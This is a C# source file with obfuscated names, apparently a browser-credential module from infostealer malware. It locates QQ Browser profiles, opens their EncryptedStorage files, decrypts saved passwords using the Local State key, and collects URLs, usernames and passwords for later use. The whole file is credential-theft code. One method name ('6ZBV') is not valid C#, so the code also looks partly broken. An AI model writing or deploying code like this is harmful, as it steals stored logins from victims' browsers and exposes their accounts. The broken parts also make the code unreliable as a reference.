using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using C6Zy;
using rCOGWW;
using UCgTB4iR;

namespace rk937aHHc
{
	public class QQ_Browser : EtbH
	{
		public QQ_Browser()
		{
			this.YfOOZiB8 = "QQ Browser";
		}

		public string YfOOZiB8 { get; set; }
        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> result = new List<WTitxI2m>();

            string basePath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Tencent\\QQBrowser\\User Data"
            );

            if (!Directory.Exists(basePath))
                return result;

            List<string> encryptedStorages = new List<string>();

            encryptedStorages.Add(
                Path.Combine(basePath, "Default", "EncryptedStorage")
            );

            foreach (string profileDir in Directory.GetDirectories(basePath))
            {
                if (profileDir.Contains("Profile"))
                {
                    encryptedStorages.Add(
                        Path.Combine(profileDir, "EncryptedStorage")
                    );
                }
            }

            foreach (string storagePath in encryptedStorages)
            {
                if (!File.Exists(storagePath))
                    continue;

                btrVogW storage;
                try
                {
                    storage = new btrVogW(storagePath);
                }
                catch
                {
                    continue;
                }

                if (!storage.f9NLCu("entries"))
                    continue;

                // Local State 기반 복호화 키
                byte[] localKey = UCgTB4iR.SetupDataLists.6ZBV(
                    Directory.GetParent(storagePath).Parent.FullName
                );

                for (int i = 0; i < storage.unm(); i++)
                {
                    if (storage.jK2IxJ35o1(i, "category") != "Password")
                        continue;

                    try
                    {
                        string url = storage.jK2IxJ35o1(i, "str3");
                        string username = storage.jK2IxJ35o1(i, "str2");

                        string password = UCgTB4iR.SetupDataLists.NFZOVQvXL(
                            storage.jK2IxJ35o1(i, "blob0")
                        );

                        if (string.IsNullOrEmpty(password) && localKey != null)
                        {
                            password = UCgTB4iR.SetupDataLists.VYX(
                                Encoding.Default.GetBytes(
                                    storage.jK2IxJ35o1(i, "password_value")
                                ),
                                localKey
                            );
                        }

                        if (!string.IsNullOrEmpty(url) &&
                            !string.IsNullOrEmpty(username) &&
                            password != null)
                        {
                            result.Add(new WTitxI2m
                            {
                                data1 = url,
                                data2 = username,
                                data3 = password,
                                data4 = this.YfOOZiB8
                            });
                        }
                    }
                    catch
                    {
                    }
                }
            }

            return result;
        }
    }
}
